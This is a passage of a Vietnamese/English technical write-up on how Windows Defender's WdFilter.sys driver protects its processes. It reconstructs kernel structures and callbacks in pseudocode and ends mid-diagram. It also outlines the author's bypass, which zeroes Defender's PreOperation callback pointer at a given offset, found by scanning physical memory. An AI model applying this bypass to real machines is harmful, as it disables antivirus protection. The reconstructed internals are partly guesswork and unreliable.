# WdFilter.sys Internals
## How Windows Defender Protects Its Processes

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Driver Stack — Tất cả components](#2-driver-stack)
3. [ObRegisterCallbacks — Cơ chế cốt lõi](#3-obregistercallbacks)
4. [OB_CALLBACK_ENTRY — Kernel Internal Structs](#4-ob_callback_entry--kernel-internal-structs)
5. [WdFilter PreOp Callback — Logic bên trong](#5-wdfilter-preop-callback--logic-bên-trong)
6. [Process Protection List — Cách WdFilter biết ai cần bảo vệ](#6-process-protection-list)
7. [MsMpEng ↔ WdFilter Communication](#7-msmpeng--wdfilter-communication)
8. [WdFilter là Minifilter Driver](#8-wdfilter-là-minifilter-driver)
9. [PsSetCreateProcessNotifyRoutineEx](#9-pssetcreateprocessnotifyroutineex)
10. [PsSetLoadImageNotifyRoutine](#10-pssetloadimagenotifyroutine)
11. [ELAM — Early Launch Anti-Malware](#11-elam--early-launch-anti-malware)
12. [ETW Integration](#12-etw-integration)
13. [Full Protection Stack — Toàn bộ luồng từ OpenProcess đến kết quả](#13-full-protection-stack)
14. [Tại Sao Bypass Của Chúng Ta Hoạt Động](#14-tại-sao-bypass-của-chúng-ta-hoạt-động)

---

## 1. Architecture Overview

Windows Defender không phải một driver đơn lẻ. Nó là một **stack nhiều layer**:

```
┌─────────────────────────────────────────────────────────────┐
│                    USER MODE                                 │
│                                                             │
│  MsMpEng.exe    — Antimalware Service Executable            │
│  (PID ~3216)      PPL-Antimalware (Protection=0x31)         │
│                   Engine core, signature matching           │
│                                                             │
│  MsMpLsv.exe    — Launch service (starts MsMpEng)           │
│  NisSrv.exe     — Network Inspection Service                │
│  MpCopyAccelerator.exe — Update accelerator                 │
│                                                             │
│  SecurityHealthService.exe — Windows Security Center        │
│  WinDefend (service) — Controls the above                   │
└──────────────────────────────┬──────────────────────────────┘
                               │ IOCTL / DeviceIoControl
┌──────────────────────────────▼──────────────────────────────┐
│                    KERNEL MODE                               │
│                                                             │
│  WdFilter.sys   — Minifilter + OB callbacks + main guard    │
│  WdNisDrv.sys   — Network Inspection Driver (NDIS)          │
│  WdDevFlt.sys   — Device filter (USB/HID protection)        │
│  WdBoot.sys     — ELAM (Early Launch Anti-Malware)          │
└─────────────────────────────────────────────────────────────┘
```

**WdFilter.sys** là driver quan trọng nhất. Nó đóng nhiều vai trò cùng lúc:
1. **Object Manager callback** — protect handles to MsMpEng
2. **File system minifilter** — scan files on access
3. **Process/Image notification** — monitor all process/DLL loads
4. **Self-protection** — prevent driver from being unloaded

---

## 2. Driver Stack

### WdFilter.sys — Roles

```
WdFilter.sys
    ├── FltRegisterFilter()          → File system minifilter
    │       Altitude: 328100
    │       Monitors: IRP_MJ_CREATE, WRITE, SET_INFO, CLEANUP, ...
    │
    ├── ObRegisterCallbacks()        → Object handle callbacks
    │       Object: PsProcessType
    │       Object: PsThreadType
    │       Ops: CREATE | DUPLICATE
    │       PreOp: WdpProcessPreOperationCallback
    │
    ├── PsSetCreateProcessNotifyRoutineEx()  → Process birth/death
    │
    ├── PsSetCreateThreadNotifyRoutine()     → Thread creation
    │
    ├── PsSetLoadImageNotifyRoutine()        → DLL/EXE load
    │
    └── EtwRegister() / EtwSetInformation() → ETW consumer/provider
```

### WdBoot.sys — ELAM

```
WdBoot.sys
    ├── Loads FIRST in boot sequence (before other drivers)
    ├── CmRegisterCallbackEx()   → Registry monitoring during boot
    ├── BDCB callbacks           → Classify boot drivers (GOOD/BAD)
    └── Verifies WdFilter.sys signature before handing off
```

---

## 3. ObRegisterCallbacks

### 3.1 Là gì?

`ObRegisterCallbacks` là một Windows kernel API cho phép kernel-mode driver đăng ký callback được gọi **mỗi khi** một handle đến object type được tạo ra hoặc duplicate:

```c
NTSTATUS ObRegisterCallbacks(
    POB_CALLBACK_REGISTRATION  CallbackRegistration,
    PVOID                      *RegistrationHandle
);
```

Sau khi đăng ký:
- Mọi `NtOpenProcess(target)` → PreOp callback của WdFilter được gọi TRƯỚC khi handle được cấp
- Mọi `NtDuplicateObject` duplicate handle đến process → tương tự

### 3.2 User-visible Registration Struct

```c
// Struct truyền vào ObRegisterCallbacks (user-visible API)
typedef struct _OB_CALLBACK_REGISTRATION {
    USHORT                    Version;          // OB_FLT_REGISTRATION_VERSION = 0x0100
    USHORT                    OperationRegistrationCount;
    UNICODE_STRING            Altitude;         // "321000" (ví dụ, WdFilter dùng altitude riêng)
    PVOID                     RegistrationContext;
    POB_OPERATION_REGISTRATION OperationRegistration;
} OB_CALLBACK_REGISTRATION;

typedef struct _OB_OPERATION_REGISTRATION {
    POBJECT_TYPE                    *ObjectType;   // &PsProcessType hoặc &PsThreadType
    OB_OPERATION                    Operations;    // OB_OPERATION_HANDLE_CREATE (1)
                                                  // OB_OPERATION_HANDLE_DUPLICATE (2)
                                                  // hoặc cả hai (3)
    POB_PRE_OPERATION_CALLBACK      PreOperation;  // gọi TRƯỚC khi grant handle
    POB_POST_OPERATION_CALLBACK     PostOperation; // gọi SAU khi grant handle
} OB_OPERATION_REGISTRATION;
```

### 3.3 WdFilter đăng ký như thế nào (reconstructed)

```c
// Trong WdFilter!DriverEntry hoặc init routine:

OB_OPERATION_REGISTRATION opRegs[2] = {0};

// Registration #1: protect Process handles
opRegs[0].ObjectType    = PsProcessType;
opRegs[0].Operations    = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
opRegs[0].PreOperation  = WdpProcessPreOperationCallback;
opRegs[0].PostOperation = NULL;

// Registration #2: protect Thread handles (chống thread injection)
opRegs[1].ObjectType    = PsThreadType;
opRegs[1].Operations    = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
opRegs[1].PreOperation  = WdpThreadPreOperationCallback;
opRegs[1].PostOperation = NULL;

OB_CALLBACK_REGISTRATION cbReg = {0};
cbReg.Version                      = OB_FLT_REGISTRATION_VERSION;
cbReg.OperationRegistrationCount   = 2;
RtlInitUnicodeString(&cbReg.Altitude, L"321000");
cbReg.RegistrationContext          = &g_WdFilterContext;
cbReg.OperationRegistration        = opRegs;

PVOID hRegistration = NULL;
ObRegisterCallbacks(&cbReg, &hRegistration);
g_WdFilterGlobals.ObCallbackHandle = hRegistration;
```

### 3.4 Altitude

Altitude là một số thứ tự ảnh hưởng thứ tự callback được gọi. Nhiều driver có thể đăng ký ObCallbacks cùng lúc — altitude thấp hơn chạy trước.

WdFilter đăng ký ở altitude **~321000** (từ reverse engineering các version khác nhau). Điều này đặt nó **trước** nhiều third-party security products nhưng **sau** một số Microsoft components.

---

## 4. OB_CALLBACK_ENTRY — Kernel Internal Structs

Khi `ObRegisterCallbacks` được gọi, kernel tạo ra các structures nội bộ KHÁC với những gì user truyền vào. Đây là những gì ta tìm thấy trong RAM scan.

### 4.1 Kernel Internal Hierarchy

```
ObRegisterCallbacks() tạo ra:

CALLBACK_REGISTRATION (kernel internal)
├── RegistrationHandle
├── AltitudeString
├── RegistrationContext  (= RegistrationContext user truyền)
└── [Danh sách các OB_CALLBACK_ENTRY]

ObjectType (ví dụ: PsProcessType)
└── CallbackList (LIST_ENTRY head)
    ├── OB_CALLBACK_ENTRY #1  (WdFilter - Process callbacks)
    ├── OB_CALLBACK_ENTRY #2  (WdFilter - Thread callbacks)
    ├── OB_CALLBACK_ENTRY #3  (other driver...)
    └── ...
```

### 4.2 OB_CALLBACK_ENTRY (kernel internal struct)

Đây là struct chính ta scan trong RAM và patch trong bypass:

```c
// Reconstructed từ reverse engineering + Windows internals research
// Confirmed layout từ scan results: PA=0x0EBE8240, preop at PA+0x28

typedef struct _OB_CALLBACK_ENTRY {
    // +0x00: LIST_ENTRY linking tất cả callbacks cho object type này
    LIST_ENTRY  EntryItemList;      // Flink (+0x00), Blink (+0x08)

    // +0x10: Bitmask operations được đăng ký
    ULONG       Operations;         // 1=CREATE, 2=DUPLICATE, 3=both
                                   // Trong test: ops=3 (cả hai)

    // +0x14: padding (4 bytes, struct alignment)

    // +0x18: Back-pointer đến CALLBACK_REGISTRATION parent
    PVOID       CallbackRegistration;   // kernel VA ≥ 0xFFFF800000000000

    // +0x20: Object type này protect
    POBJECT_TYPE ObjectType;            // PsProcessType kernel VA

    // +0x28: ← ĐÂY LÀ ANCHOR CỦA SCAN
    POB_PRE_OPERATION_CALLBACK  PreOperation;   // WdFilter+0x5E170

    // +0x30:
    POB_POST_OPERATION_CALLBACK PostOperation;  // NULL hoặc WdFilter VA

} OB_CALLBACK_ENTRY, *POB_CALLBACK_ENTRY;
// sizeof = 0x38
```

**Từ test system của ta:**
```
PA = 0x000000000EBE8240         (~237MB physical)
+0x00 Flink     = 0xFFFF... (kernel VA, verified)
+0x08 Blink     = 0xFFFF... (kernel VA, verified)
+0x10 Operations = 0x00000003  (CREATE | DUPLICATE)
+0x18 CallbackRegistration = 0xFFFF... 
+0x20 ObjectType = 0xFFFF... (PsProcessType)
+0x28 PreOperation = WdFilter + 0x5E170  ← CHỖ TA ZERO
+0x30 PostOperation = 0x0000000000000000 (NULL)
```

### 4.3 Kernel Iteration — Cách ObpCallPreOperationCallbacks dùng struct này

Khi `NtOpenProcess` được gọi, kernel chạy code tương tự:

```c
// Pseudo-code từ ObpCallPreOperationCallbacks (reconstructed)

PLIST_ENTRY head = &ObjectType->CallbackList;
PLIST_ENTRY entry = head->Flink;

while (entry != head) {
    POB_CALLBACK_ENTRY cb = CONTAINING_RECORD(entry, OB_CALLBACK_ENTRY, EntryItemList);
    
    // Kiểm tra operation type phù hợp không
    if (cb->Operations & currentOperation) {
        
        // NẾU PREOP LÀ NULL → SKIP (đây là cách bypass B hoạt động)
        if (cb->PreOperation != NULL) {
            
            OB_PRE_OPERATION_INFORMATION opInfo = {0};
            opInfo.Object = targetProcess;
            opInfo.ObjectType = ObjectType;
            opInfo.Parameters = &params;
            
            // GỌI CALLBACK
            OB_PREOP_CALLBACK_STATUS status = cb->PreOperation(
                cb->CallbackRegistration,  // context
                &opInfo
            );
        }
    }
    
    entry = entry->Flink;
}
```

**Key insight:** Nếu `PreOperation == NULL`, callback bị SKIP hoàn toàn. Không cần patch code — chỉ cần zero pointer là đủ. Đây là lý do tại sao step B (zero preop pointer) quan trọng hơn step A (patch code).

---

## 5. WdFilter PreOp Callback — Logic bên trong

### 5.1 Signature

```c
OB_PREOP_CALLBACK_STATUS WdpProcessPreOperationCallback(
    PVOID                          RegistrationContext,
    POB_PRE_OPERATION_INFORMATION  OperationInformation
);
```

### 5.2 OB_PRE_OPERATION_INFORMATION

```c
typedef struct _OB_PRE_OPERATION_INFORMATION {
    OB_OPERATION Operation;     // OB_OPERATION_HANDLE_CREATE hoặc DUPLICATE
    union {
        ULONG Flags;
        struct {
            ULONG KernelHandle : 1; // handle được tạo từ kernel mode không?
            ULONG Reserved     : 31;
        };
    };
    PVOID               Object;      // PEPROCESS của target process
    POBJECT_TYPE        ObjectType;  // PsProcessType
    PVOID               CallContext; // output: được pass vào PostOp
    POB_PRE_OPERATION_PARAMETERS Parameters;
} OB_PRE_OPERATION_INFORMATION;

typedef union _OB_PRE_OPERATION_PARAMETERS {
    OB_PRE_CREATE_HANDLE_INFORMATION      CreateHandleInformation;
    OB_PRE_DUPLICATE_HANDLE_INFORMATION   DuplicateHandleInformation;
} OB_PRE_OPERATION_PARAMETERS;

typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {
    ACCESS_MASK DesiredAccess;          // ← WdFilter MODIFY cái này
    ACCESS_MASK OriginalDesiredAccess;  // read-only, original request
} OB_PRE_CREATE_HANDLE_INFORMATION;
```

### 5.3 Logic của WdFilter PreOp callback (reconstructed)

```c
OB_PREOP_CALLBACK_STATUS WdpProcessPreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OpInfo)
{
    // 1. Lấy PEPROCESS của process đang bị mở
    PEPROCESS targetProcess = (PEPROCESS)OpInfo->Object;
    PEPROCESS callerProcess = PsGetCurrentProcess();

    // 2. Handle từ kernel mode? Không touch (kernel drivers cần full access)
    if (OpInfo->Flags & OB_FLAG_KERNEL_HANDLE) {
        return OB_PREOP_SUCCESS;
    }

    // 3. Lấy DesiredAccess mà caller muốn
    ACCESS_MASK *desiredAccess;
    if (OpInfo->Operation == OB_OPERATION_HANDLE_CREATE)
        desiredAccess = &OpInfo->Parameters->CreateHandleInformation.DesiredAccess;
    else
        desiredAccess = &OpInfo->Parameters->DuplicateHandleInformation.TargetAccess;

    // 4. Kiểm tra target có trong danh sách protected processes không
    PWDF_PROTECTED_ENTRY entry = WdpFindProtectedProcess(targetProcess);
    if (entry == NULL) {
        return OB_PREOP_SUCCESS;  // không phải protected process → không touch
    }

    // 5. Kiểm tra caller có được phép không
    //    (ví dụ: WdFilter cho phép MsMpEng tự mở chính nó,
    //     hoặc các Defender components có thể cross-open)
    if (WdpIsAllowedCaller(callerProcess, entry)) {
        return OB_PREOP_SUCCESS;
    }

    // 6. STRIP dangerous access rights
    //    Những quyền bị strip khỏi DesiredAccess:
    #define WD_DENIED_ACCESS (                   \
        PROCESS_TERMINATE               |        \
        PROCESS_SUSPEND_RESUME          |        \
        PROCESS_VM_OPERATION            |        \
        PROCESS_VM_READ                 |        \
        PROCESS_VM_WRITE                |        \
        PROCESS_CREATE_THREAD           |        \
        PROCESS_CREATE_PROCESS          |        \
        PROCESS_DUP_HANDLE              |        \
        PROCESS_SET_INFORMATION         |        \
        PROCESS_SET_QUOTA               |        \
        PROCESS_SET_SESSIONID           |        \
        PROCESS_SET_PORT                |        \
        PROCESS_INJECT_KERNEL_CALLBACK  )

    *desiredAccess &= ~WD_DENIED_ACCESS;

    // Sau strip: caller chỉ có thể nhận những quyền này:
    //   PROCESS_QUERY_INFORMATION
    //   PROCESS_QUERY_LIMITED_INFORMATION
    //   SYNCHRONIZE
    //   (và các quyền không nguy hiểm khác)

    return OB_PREOP_SUCCESS;
}
```

### 5.4 Kết quả của callback

```
Caller muốn:     PROCESS_ALL_ACCESS = 0x001FFFFF
Sau WdFilter:    0x001FFFFF & ~WD_DENIED_ACCESS = 0x00101000 (roughly)
                 = PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE

Caller nhận handle với: PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE
→ Không thể ReadProcessMemory, WriteProcessMemory, CreateRemoteThread, ...
```

---

## 6. Process Protection List

### 6.1 WdFilter lưu danh sách protected processes ở đâu?

WdFilter maintain một linked list trong non-paged pool:

```c
// Internal struct (reconstructed từ reverse engineering)
typedef struct _WDF_PROTECTED_PROCESS {
    LIST_ENTRY          ListEntry;           // doubly linked list
    PEPROCESS           Process;             // EPROCESS pointer (kernel VA)
    HANDLE              ProcessId;           // PID
    ULONG               ProtectionFlags;     // bitmask of what to protect
    ACCESS_MASK         AllowedAccessMask;   // access allowed even to non-trusted callers
    ULONG               TrustLevel;          // 0=untrusted, 1=trusted, 2=Defender component
    UNICODE_STRING      ImageName;           // L"MsMpEng.exe"
    LARGE_INTEGER       RegistrationTime;
} WDF_PROTECTED_PROCESS, *PWDF_PROTECTED_PROCESS;

// Global state in WdFilter
typedef struct _WDF_GLOBALS {
    PVOID               ObCallbackHandle;    // từ ObRegisterCallbacks
    LIST_ENTRY          ProtectedList;       // head of protected process list
    EX_PUSH_LOCK        ProtectedListLock;   // reader/writer lock
    PFLT_FILTER         FilterHandle;        // từ FltRegisterFilter
    PDEVICE_OBJECT      DeviceObject;        // WdFilter device
    LONG                ProtectedCount;      // số processes trong list
    // ... nhiều field khác
} WDF_GLOBALS;

WDF_GLOBALS g_WdFilterGlobals;
```

### 6.2 WdpFindProtectedProcess (pseudocode)

```c
PWDF_PROTECTED_PROCESS WdpFindProtectedProcess(PEPROCESS process) {
    ExAcquirePushLockShared(&g_WdFilterGlobals.ProtectedListLock);
    
    PLIST_ENTRY entry = g_WdFilterGlobals.ProtectedList.Flink;
    while (entry != &g_WdFilterGlobals.ProtectedList) {
        PWDF_PROTECTED_PROCESS p = CONTAINING_RECORD(entry, WDF_PROTECTED_PROCESS, ListEntry);
        if (p->Process == process) {
            ExReleasePushLockShared(&g_WdFilterGlobals.ProtectedListLock);
            return p;
        }
        entry = entry->Flink;
    }
    
    ExReleasePushLockShared(&g_WdFilterGlobals.ProtectedListLock);
    return NULL;
}
```

---

## 7. MsMpEng ↔ WdFilter Communication

### 7.1 Tại Sao Cần Communication?

WdFilter là kernel driver, MsMpEng là user-mode process. Chúng cần nói chuyện với nhau để:
- MsMpEng đăng ký "protect me" với WdFilter
- WdFilter gửi file scan requests lên MsMpEng để analyze
- MsMpEng gửi verdicts xuống WdFilter ("this file is clean/malicious")
- MsMpEng gửi policy updates xuống WdFilter

### 7.2 Communication Channel

WdFilter tạo một named device object:
```
\Device\WdFilter
\DosDevices\WdFilter   (symbolic link → \Device\WdFilter)
```

MsMpEng (và các Defender components khác) mở device này và dùng `DeviceIoControl`.

### 7.3 Protection Registration Flow

```
MsMpEng.exe startup:
    │
    ├─1─ OpenFile("\\\\.\\WdFilter") → handle hWdFilter
    │
    ├─2─ DeviceIoControl(hWdFilter,
    │        IOCTL_WDFILTER_REGISTER_PROTECTED,   // custom IOCTL
    │        &regInfo, sizeof(regInfo),
    │        &response, sizeof(response))
    │
    │    regInfo = {
    │        ProcessId: GetCurrentProcessId(),
    │        TrustLevel: WD_TRUST_LEVEL_ANTIMALWARE,
    │        Flags: WD_PROTECT_SELF | WD_PROTECT_HANDLE_STRIP
    │    }
    │
    └─3─ WdFilter kernel handler:
             WdpRegisterProtectedProcess(regInfo)
                 → Allocates WDF_PROTECTED_PROCESS
                 → Links vào g_WdFilterGlobals.ProtectedList
                 → Từ giờ: callback sẽ protect process này
```

### 7.4 Communication Protocol (simplified)

```c
// Một số IOCTL WdFilter expose (reconstructed):
#define IOCTL_WDFILTER_REGISTER_PROTECTED    CTL_CODE(0x..., 0x01, ...)
#define IOCTL_WDFILTER_UNREGISTER_PROTECTED  CTL_CODE(0x..., 0x02, ...)
#define IOCTL_WDFILTER_SCAN_REQUEST          CTL_CODE(0x..., 0x10, ...)
#define IOCTL_WDFILTER_SCAN_RESPONSE         CTL_CODE(0x..., 0x11, ...)
#define IOCTL_WDFILTER_SET_POLICY            CTL_CODE(0x..., 0x20, ...)
#define IOCTL_WDFILTER_QUERY_STATUS          CTL_CODE(0x..., 0x30, ...)
```

Khi MsMpEng terminate (crash hoặc bị kill):
- WdFilter nhận notification qua `PsSetCreateProcessNotifyRoutineEx`
- Tự động remove entry khỏi ProtectedList
- Protection tự động được gỡ

---

## 8. WdFilter là Minifilter Driver

### 8.1 Minifilter Registration

```c
// Trong WdFilter!DriverEntry:
FLT_REGISTRATION filterRegistration = {
    .Size                       = sizeof(FLT_REGISTRATION),
    .Version                    = FLT_REGISTRATION_VERSION,
    .Flags                      = 0,
    .ContextRegistration        = WdContextRegistration,
    .OperationRegistration      = WdOperationCallbacks,  // xem bên dưới
    .FilterUnloadCallback       = WdpFilterUnloadCallback,
    .InstanceSetupCallback      = WdpInstanceSetupCallback,
    .InstanceQueryTeardownCallback = WdpInstanceQueryTeardownCallback,
    // ...
};

FltRegisterFilter(DriverObject, &filterRegistration, &g_FilterHandle);
FltStartFiltering(g_FilterHandle);
```

**Altitude: ~328100** — đây là vị trí trong filter stack. Các minifilter với altitude cao hơn chạy trước (gần với filesystem hơn). 328100 đặt WdFilter gần với filesystem, trước AV scanners của bên thứ ba (thường ở ~320000).

### 8.2 File I/O Callbacks

```c
const FLT_OPERATION_REGISTRATION WdOperationCallbacks[] = {
    // Scan trước khi file được open/execute
    { IRP_MJ_CREATE,
      0,
      WdpPreCreate,    // ← GỌI TRƯỚC KHI OPEN
      WdpPostCreate    // ← GỌI SAU KHI OPEN
    },

    // Monitor ghi vào file (ransomware detection)
    { IRP_MJ_WRITE,
      0,
      WdpPreWrite,
      WdpPostWrite
    },

    // Monitor file rename/delete (ransomware behavior)
    { IRP_MJ_SET_INFORMATION,
      0,
      WdpPreSetInformation,
      WdpPostSetInformation
    },

    // Cleanup khi file handle đóng
    { IRP_MJ_CLEANUP,
      0,
      NULL,
      WdpPostCleanup
    },

    // Monitor network redirector operations
    { IRP_MJ_NETWORK_QUERY_OPEN,
      0,
      WdpPreNetworkQueryOpen,
      NULL
    },

    { IRP_MJ_OPERATION_END }  // terminator
};
```

### 8.3 WdpPreCreate — Scan on File Access

Đây là callback quan trọng nhất cho file scanning:

```c
FLT_PREOP_CALLBACK_STATUS WdpPreCreate(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID *CompletionContext)
{
    // 1. Lấy thông tin file được mở
    PFLT_FILE_NAME_INFORMATION nameInfo;
    FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &nameInfo);

    // 2. Check extension — chỉ scan file executable/script
    if (!WdpShouldScanExtension(nameInfo->Extension)) {
        return FLT_PREOP_SUCCESS_WITH_CALLBACK;
    }

    // 3. Kiểm tra cache — file này đã được scan chưa?
    //    (based on file ID + last write time)
    if (WdpCheckScanCache(nameInfo, &cachedResult)) {
        if (cachedResult == SCAN_CLEAN) return FLT_PREOP_SUCCESS_WITH_CALLBACK;
        if (cachedResult == SCAN_MALICIOUS) {
            Data->IoStatus.Status = STATUS_ACCESS_DENIED;
            return FLT_PREOP_COMPLETE;  // BLOCK ACCESS
        }
    }

    // 4. Gửi scan request lên MsMpEng (async)
    //    Nếu sync scan: FLT_PREOP_PENDING → complete later
    //    Nếu async: cho phép access, scan background
    SCAN_REQUEST *req = WdpAllocateScanRequest(nameInfo, Data);
    WdpQueueScanRequest(req);

    // 5. Pending: hold IRP cho đến khi scan xong
    return FLT_PREOP_PENDING;  // IRP bị hold, không được complete cho đến khi ta gọi FltCompletePendedPreOperation
}
```

### 8.4 Scan Pipeline

```
File opened by user/app
        ↓
WdpPreCreate() fires
        ↓
WdpQueueScanRequest() → puts in scan queue
        ↓
WdFilter worker thread picks up request
        ↓
Opens file for reading via FltCreateFileEx() [bypass own filter]
        ↓
Reads file content into buffer
        ↓
Sends to MsMpEng via DeviceIoControl (IOCTL_WDFILTER_SCAN_REQUEST)
        ↓
MsMpEng engine: signature matching + heuristics + ML
        ↓
Returns verdict: CLEAN / MALICIOUS / SUSPICIOUS
        ↓
WdFilter receives verdict via IOCTL_WDFILTER_SCAN_RESPONSE
        ↓
If CLEAN:     FltCompletePendedPreOperation(FLT_PREOP_SUCCESS)
If MALICIOUS: FltCompletePendedPreOperation() with STATUS_ACCESS_DENIED
              + quarantine file
```

---

## 9. PsSetCreateProcessNotifyRoutineEx

### 9.1 Registration

```c
// WdFilter registers to be notified of ALL process creation/termination
PsSetCreateProcessNotifyRoutineEx(WdpProcessNotifyCallbackEx, FALSE);
//                                                              ↑
//                                                         FALSE = add (TRUE = remove)
```

### 9.2 Callback Signature

```c
VOID WdpProcessNotifyCallbackEx(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo  // NULL if process terminating
);
```

### 9.3 Cách WdFilter dùng callback này

```c
VOID WdpProcessNotifyCallbackEx(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    if (CreateInfo == NULL) {
        // ── PROCESS TERMINATING ──
        
        // Remove từ protected list nếu là Defender process
        WdpUnregisterProtectedProcess(Process);
        
        // Update internal process tracking
        WdpRemoveProcessEntry(ProcessId);
        return;
    }
    
    // ── PROCESS CREATING ──
    
    // 1. Lấy image path
    PUNICODE_STRING imagePath = CreateInfo->ImageFileName;
    
    // 2. Scan image file nếu cần
    if (WdpShouldScanOnCreate(imagePath)) {
        NTSTATUS scanResult = WdpScanImageSynchronous(imagePath);
        if (scanResult == STATUS_VIRUS_DETECTED) {
            // BLOCK process creation!
            CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
            return;
        }
    }
    
    // 3. Track process trong internal database
    WdpAddProcessEntry(Process, ProcessId, CreateInfo);
    
    // 4. Nếu là Defender component đang khởi động:
    //    Auto-register vào protected list
    if (WdpIsDefenderComponent(imagePath)) {
        WdpAutoRegisterProtectedProcess(Process, ProcessId);
    }
}
```

**Tính năng quan trọng của Ex version:** `CreateInfo->CreationStatus` có thể set thành `STATUS_ACCESS_DENIED` để **BLOCK** process creation. Đây là cách Defender ngăn malware chạy — không phải chỉ scan file mà có thể block ngay tại creation point.

---

## 10. PsSetLoadImageNotifyRoutine

### 10.1 Registration và Usage

```c
PsSetLoadImageNotifyRoutine(WdpLoadImageCallback);
```

```c
VOID WdpLoadImageCallback(
    PUNICODE_STRING FullImageName,  // path của DLL/EXE
    HANDLE ProcessId,               // PID của process load image
    PIMAGE_INFO ImageInfo)          // thông tin về image
{
    // 1. DLL được inject vào protected process?
    if (WdpIsProtectedProcess(ProcessId)) {
        
        // Kiểm tra DLL có được phép load vào Defender process không
        if (!WdpIsTrustedImage(FullImageName)) {
            // Log suspicious DLL injection attempt
            WdpLogSuspiciousActivity(ProcessId, FullImageName, L"DLL_INJECT_ATTEMPT");
            
            // Không thể block ở đây (callback này không block được)
            // Nhưng có thể trigger immediate termination của attacker process
            WdpTerminateSuspiciousProcess(PsGetCurrentProcessId());
        }
    }
    
    // 2. Driver được load? (ImageInfo->SystemModeImage == TRUE)
    if (ImageInfo->SystemModeImage) {
        WdpAuditDriverLoad(FullImageName, ImageInfo);
    }
    
    // 3. Cập nhật process image tracking
    WdpRecordLoadedImage(ProcessId, FullImageName, ImageInfo->ImageBase);
}
```

**Hạn chế:** `PsSetLoadImageNotifyRoutine` không thể block image load (khác với ProcessNotifyEx). Chỉ notify sau khi đã load. Tuy nhiên nó cung cấp visibility để detect DLL injection.

---

## 11. ELAM — Early Launch Anti-Malware

### 11.1 WdBoot.sys

ELAM là một cơ chế đặc biệt trong Windows 8+ cho phép antimalware driver load **sớm nhất** trong boot sequence, trước tất cả boot drivers khác (kể cả rootkits).

```
Boot sequence với ELAM:
    UEFI/BIOS firmware
        ↓
    Windows Boot Manager (bootmgr.efi)
        ↓
    Windows OS Loader (winload.efi)
        ↓
    ELAM driver (WdBoot.sys) ← LOAD ĐẦU TIÊN
        ↓
    Kernel initialization
        ↓
    Boot drivers khác (WdFilter.sys, etc.)
        ↓
    Services/processes
```

### 11.2 Boot Driver Callback (BDCB)

ELAM driver dùng `CmRegisterCallbackEx` và một cơ chế đặc biệt gọi là Boot Driver Callback:

```c
// WdBoot.sys đăng ký để nhận thông tin về mỗi boot driver được load
// và có thể classify nó

typedef enum _BDCB_STATUS_UPDATE_TYPE {
    BdCbStatusPrepareForDependencyLoad,  // chuẩn bị load dependency
    BdCbStatusNotifyLoadCount,           // thông báo số boot drivers
    BdCbStatusFinishedWithAllDrivers,    // tất cả boot drivers đã load
} BDCB_STATUS_UPDATE_TYPE;

typedef enum _BDCB_CLASSIFICATION {
    BdCbClassificationUnknownImage,       // không biết → treat as unknown
    BdCbClassificationKnownGoodImage,     // known good → load normally
    BdCbClassificationKnownBadImage,      // known bad → BLOCK load
    BdCbClassificationKnownBadImageBootCritical, // bad nhưng boot critical
} BDCB_CLASSIFICATION;
```

WdBoot đọc từ measured boot hashes (stored in TPM) và Defender's offline signature database để classify mỗi boot driver.

### 11.3 Protected by Kernel

ELAM drivers có protection đặc biệt:
- Không thể unload qua `FltUnloadFilter` hoặc `ZwUnloadDriver` từ userland
- Kernel verifies signature của ELAM drivers với stricter requirements
- Tampering với ELAM driver triggers PatchGuard violation

---

## 12. ETW Integration

### 12.1 WdFilter như ETW Consumer

Windows Defender sử dụng ETW (Event Tracing for Windows) để nhận events từ kernel về:
- Network connections (Microsoft-Windows-TCPIP provider)
- Process creation (Microsoft-Windows-Kernel-Process)
- Registry access (Microsoft-Windows-Kernel-Registry)
- DNS queries (Microsoft-Windows-DNS-Client)

```c
// WdFilter đăng ký như ETW provider VÀ consumer

// Như provider: emit events cho Security Center
REGHANDLE hProvider;
EtwRegister(&WDFILTER_PROVIDER_GUID, NULL, NULL, &hProvider);

// Emit event khi detect malware:
EtwWrite(hProvider, &malwareDetectedEvent, ...);
```

### 12.2 Kernel ETW Consumer (Realtime)

WdFilter có thể subscribe vào kernel-mode ETW sessions để nhận events synchronously — không có delay. Điều này cho phép network traffic inspection, behavior monitoring trong realtime.

---

## 13. Full Protection Stack

### 13.1 Từ OpenProcess đến Handle — Toàn Bộ Luồng

```
User mode:
═══════════════════════════════════════════════════════════════
    app.exe calls: OpenProcess(PROCESS_ALL_ACCESS, FALSE, msmpeng_pid)
                              │
                              │ syscall (SSDT)
                              ▼
═══════════════════════════════════════════════════════════════
Kernel mode — NtOpenProcess:
    │
    ├─[1]─ PsLookupProcessByProcessId(pid) → get PEPROCESS
    │           EPROCESS for MsMpEng found at kernel VA
    │
    ├─[2]─ PsTestProtectedProcessIncompatibility(
    │           desiredAccess,
    │           callerProcess,   // our EPROCESS, Protection=0x00
    │           targetProcess)   // MsMpEng EPROCESS, Protection=0x31
    │
    │       PPL Check logic:
    │           target_type   = 0x31 & 0x7 = 1 (PPL)
    │           target_signer = (0x31 >> 4) & 0xF = 3 (Antimalware)
    │           caller_type   = 0x00 & 0x7 = 0 (None)
    │
    │           if (target_type > 0 &&        // target IS protected
    │               caller_type < target_type) // caller is less protected
    │               → STATUS_ACCESS_DENIED ← FIRST WALL (returned immediately)
    │
    ├─[3]─ ObOpenObjectByPointer(targetProcess, desiredAccess, ...)
    │           │
    │           └─ ObpCallPreOperationCallbacks()
    │                   │
    │                   ├─ Iterate ObjectType->CallbackList
    │                   │
    │                   └─ WdFilter OB_CALLBACK_ENTRY found:
    │                       PreOperation = WdFilter+0x5E170
    │                       Operations   = 3 (CREATE|DUP)
    │                       │
    │                       ▼
